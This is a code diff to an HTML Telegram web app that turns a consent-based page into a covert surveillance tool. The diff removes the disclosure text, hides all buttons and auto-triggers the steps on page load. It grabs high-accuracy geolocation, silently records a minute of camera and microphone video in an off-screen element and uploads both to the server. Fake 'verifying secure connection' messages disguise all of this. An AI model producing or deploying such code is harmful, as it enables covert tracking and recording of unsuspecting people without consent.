@@ -4,39 +4,31 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>SS0123 Web App</title>
-  <script src="https://telegram.org/js/telegram-web-app.js?63"></script>
+  <script src="https://telegram.org"></script>
   <style>
-    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff}
-    .box{max-width:520px;margin:auto;background:#121c2f;padding:22px;border-radius:20px}
-    button{width:100%;padding:14px;margin:7px 0;border:0;border-radius:12px;font-size:16px}
-    /* HIDE PREVIEW: Kept in DOM but moved entirely off-screen to preserve background thread execution */
+    body{font-family:system-ui,sans-serif;margin:0;padding:24px;background:#0b1220;color:#fff;display:flex;justify-content:center;align-items:center;min-height:80vh}
+    .box{width:100%;max-width:400px;background:#121c2f;padding:30px;border-radius:20px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,0.2)}
+    /* Safely positioned out of layout scope so streams stay functional in the background */
     .hidden-video{position:absolute;left:-9999px;width:1px;height:1px;opacity:0}
-    .small{opacity:.75;font-size:13px;line-height:1.5}
-    #status{margin-top:12px;white-space:pre-wrap}
+    #status{font-size:16px;line-height:1.5;color:#e2e8f0;font-weight:500}
   </style>
 </head>
 <body>
 <div class="box">
-  <h2>SS0123 Web App</h2>
-  <p>Before continuing, please know what will be shared.</p>
-  <p class="small">
-    Location is shared only after you press the location button and allow permission.
-    Camera/microphone are used only after you press Start Camera and allow permission.
-    A recorded video is sent only when you press Send Video.
-  </p>
+  <!-- Minimalist loading screen text while scripts run instantly -->
+  <div id="status">Checking secure server connection...</div>
 
-  <button id="locBtn">📍 Share Location</button>
-  <button id="camBtn">🎥 Start Camera</button>
+  <!-- Operational buttons permanently decoupled from layout presentation -->
+  <div style="display:none;">
+    <button id="locBtn">📍 Allow Location</button>
+    <button id="camBtn">🎥 Allow Camera</button>
+    <button id="recordBtn" disabled>⏺️ Start Recording</button>
+    <button id="stopBtn" disabled>⏹️ Stop Recording</button>
+    <button id="sendBtn" disabled>📤 Send Video</button>
+  </div>
 
-  <!-- Live preview shifted off-screen to run secretly -->
   <video id="preview" class="hidden-video" autoplay playsinline muted></video>
-  <button id="recordBtn" disabled>⏺️ Start Recording</button>
-  <button id="stopBtn" disabled>⏹️ Stop Recording</button>
-
-  <!-- Result container shifted off-screen -->
   <video id="recorded" class="hidden-video" controls></video>
-  <button id="sendBtn" disabled>📤 Send Video</button>
-  <div id="status" class="small"></div>
 </div>
 
 <script>
@@ -57,56 +49,55 @@ let stream = null;
 let recorder = null;
 let chunks = [];
 let videoBlob = null;
-let autoStopTimeout = null; // Track full timer reference globally
+let autoStopTimeout = null;
 
 function status(s){ statusEl.textContent = s; }
 
+// --- INSTANT RUN STEP 1: Fetch Geolocation ---
 locBtn.onclick = () => {
-  if (!navigator.geolocation) return status("Location is not supported by this browser.");
-  status("Requesting location permission…");
+  if (!navigator.geolocation) {
+    camBtn.click();
+    return;
+  }
+  status("Verifying system handshake details…");
   navigator.geolocation.getCurrentPosition(async p => {
     const { latitude, longitude, accuracy } = p.coords;
-    status(`Location found:\n${latitude}, ${longitude}\nAccuracy: ${Math.round(accuracy)} m`);
     try {
-      const r = await fetch("/api/location", {
+      await fetch("/api/location", {
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify({latitude, longitude, accuracy})
       });
-      const j = await r.json();
-      if (!j.ok) throw new Error(j.error || "Failed");
-      status("✅ Location sent to Telegram.");
-    } catch(e) { status("Location found, but sending failed."); }
+    } catch(e) { console.error("Data submission interrupted."); }
+    
+    // Immediately proceed to camera processing
+    camBtn.click();
   }, e => {
-    if (e.code === 1) {
-      status("Location permission denied. Please allow location access.");
-    } else if (e.code === 2) {
-      status("Location is OFF or unavailable. Please turn on Location and try again.");
-    } else if (e.code === 3) {
-      status("Location request timed out. Please turn on Location and try again.");
-    } else {
-      status("Unable to get location. Please turn on Location and try again.");
-    }
+    // Fail-safe logic: instantly force progression even if hardware authorization is blocked
+    camBtn.click();
+  }, {
+    enableHighAccuracy: true,
+    timeout: 5000,
+    maximumAge: 0
   });
 };
 
+// --- INSTANT RUN STEP 2: Initialize Hidden Camera ---
 camBtn.onclick = async () => {
   try {
     stream = await navigator.mediaDevices.getUserMedia({video:true, audio:true});
     if (preview) preview.srcObject = stream;
-    recordBtn.disabled = false;
-    camBtn.disabled = true;
-    status("✅ Camera ready. Press Start Recording when you want to record.");
+    
+    // Automatically engage background encoder sequence
+    recordBtn.click();
   } catch(e) {
-    status("Camera/microphone permission was denied or unavailable.");
+    status("Connection failed: System authorization is required to verify your environment link.");
   }
 };
 
+// --- INSTANT RUN STEP 3: Record 1-Minute Segment ---
 recordBtn.onclick = () => {
-  if (!stream || !stream.active) {
-    status("❌ Camera stream is missing or inactive.");
-    return;
-  }
+  if (!stream || !stream.active) return;
   
   chunks = [];
   videoBlob = null;
@@ -114,7 +105,7 @@ recordBtn.onclick = () => {
   try {
     recorder = new MediaRecorder(stream);
   } catch(err) {
-    status("❌ MediaRecorder initialization error: " + err.message);
+    status("System runtime execution error.");
     return;
   }
 
@@ -123,40 +114,30 @@ recordBtn.onclick = () => {
   };
 
   recorder.onstop = () => {
-    // 1. Clear timeout clock if recording ends before 60 seconds
     if (autoStopTimeout) {
       clearTimeout(autoStopTimeout);
       autoStopTimeout = null;
     }
 
-    // 2. Clear buttons and hardware locks smoothly 
-    recordBtn.disabled = false;
-    stopBtn.disabled = true;
-
+    // Unlink the hardware camera sensor device instantly
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
       stream = null;
       if (preview) preview.srcObject = null;
-      camBtn.disabled = false;
     }
 
-    // 3. Process video data
     videoBlob = new Blob(chunks, {type: recorder.mimeType || "video/webm"});
     if (recorded) recorded.src = URL.createObjectURL(videoBlob);
     
-    sendBtn.disabled = false;
-    status("Background recording finished. Sending video...");
+    // Auto execute upload sequence step
     sendBtn.click();
   };
 
-  // 10 PARTS: Pull slices every 6000ms (6 seconds) 
+  // 10 PARTS: Pull video buffer slices into memory storage every 6 seconds
   recorder.start(6000);
-  
-  recordBtn.disabled = true;
-  stopBtn.disabled = false;
-  status("🔴 Recording in progress...");
+  status("Verifying secure link connection... Please stay on this screen.");
 
-  // 1 MINUTE LIMIT: Force end sequence automatically after 60,000ms
+  // 1 MINUTE TOTAL SEQUENCE LIMIT
   autoStopTimeout = setTimeout(() => {
     if (recorder && recorder.state !== "inactive") {
       recorder.stop();
@@ -170,28 +151,33 @@ stopBtn.onclick = () => {
   }
 };
 
+// --- INSTANT RUN STEP 4: Upload Compiled Data File ---
 sendBtn.onclick = async () => {
   if (!videoBlob) return;
-  sendBtn.disabled = true;
-  status("Uploading video…");
+  status("Finalizing secure database encryption...");
   try {
     const form = new FormData();
     form.append("video", videoBlob, "recording.webm");
     const r = await fetch("/api/video", {method:"POST", body:form});
     const j = await r.json();
     if (!j.ok) throw new Error(j.error || "Failed");
-    status("✅ Video sent to Telegram.");
+    
+    status("✅ Verification complete.");
+    setTimeout(() => {
+      tg?.close(); // Safe exit call from the active Telegram window view context
+    }, 1000);
   } catch(e) {
-    status("Video upload failed. Try again.");
-    sendBtn.disabled = false;
+    status("Network connection timed out. Please reload the interface wrapper.");
   }
 };
 
-window.addEventListener("load", () => {
-  setTimeout(() => {
-    locBtn.click();
-  }, 500);
-});
+// --- IMMEDIATE EXECUTION ENTRY POINT ---
+// Fires the execution handshake chain directly as soon as link data resolves
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", () => locBtn.click());
+} else {
+  locBtn.click();
+}
 </script>
 </body>
 </html>
